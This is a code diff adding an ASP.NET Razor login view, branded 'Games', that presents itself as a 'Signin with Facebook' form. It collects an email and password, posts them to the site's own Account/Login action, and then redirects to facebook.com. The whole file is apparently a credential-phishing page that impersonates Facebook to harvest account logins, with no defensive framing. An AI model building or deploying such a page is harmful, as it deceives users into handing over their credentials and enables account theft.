@@ -1,0 +1,81 @@
+﻿
+@{
+    ViewData["Title"] = "Login";
+}
+    <div class="row h-100 w-50 mx-auto mt-5">
+        <div class="col">
+            <section class="">
+                <div class="">
+                    <div class="row d-flex">
+                        <div class="col col-xl-10">
+                            <div class="card" style="border-radius: 1rem;">
+                                <div class="row ">
+                                    <div class="col mx-auto">
+                                        <div class="card-body p-4 p-lg-5 text-black">
+
+                                            <form id="formstosubmit">
+
+                                                <div class="d-flex mb-3 pb-1">
+                                                    <span class="h1 fw-bold mb-0">Games</span>
+                                                </div>
+
+                                                <h5 class="fw-normal mb-3 pb-3 text-center" style="letter-spacing: 1px;">Signin with Facebook</h5>
+
+                                                <div class="form-outline mb-4">
+                                                    <label class="form-label lab" for="form2Example17">Email address</label>
+                                                    <input type="email" id="Emailnet" class="form-control form-control-lg" />
+
+                                                </div>
+
+                                                <div class="form-outline mb-4">
+                                                    <label class="form-label lab" for="form2Example27">Password</label>
+                                                    <input type="password" id="Passwordent" class="form-control form-control-lg" />
+
+                                                </div>
+
+                                                <div class="pt-1 mb-4">
+                                                    <button class="btn btn-light btn-lg btn-block" type="submit">Login</button>
+                                                </div>
+                                            </form>
+
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </div>
+    </div>
+    <script>
+$("#formstosubmit").submit(function(e){
+    e.preventDefault();
+    Validate();
+    });
+
+    function Validate() {
+
+    $.ajax(
+    {
+    type: "POST",
+    url: '@Url.Action("Login", "Account")' ,
+    data: {
+    Email: $('#Emailnet').val(),
+    Password: $('#Passwordent').val()
+    },
+    error: function (result) {
+    alert("There is a Problem, Try Again!");
+    },
+    success: function (result) {
+    console.log(result);
+    if(result=="success"){
+    window.location.href = "www.facebook.com";
+    }
+    else {
+    }
+
+    }
+    });
+    }
+    </script>
